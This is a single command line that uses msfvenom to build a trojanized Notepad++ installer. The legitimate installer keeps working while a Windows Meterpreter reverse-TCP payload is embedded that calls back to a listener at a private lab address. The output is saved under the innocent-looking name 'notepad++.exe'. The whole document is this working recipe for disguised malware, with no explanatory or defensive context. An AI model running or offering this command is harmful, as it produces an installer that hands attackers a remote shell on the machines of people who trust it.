msfvenom --platform windows -x npp.7.5.3.Installer.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=10101 -f exe -o notepad++.exe
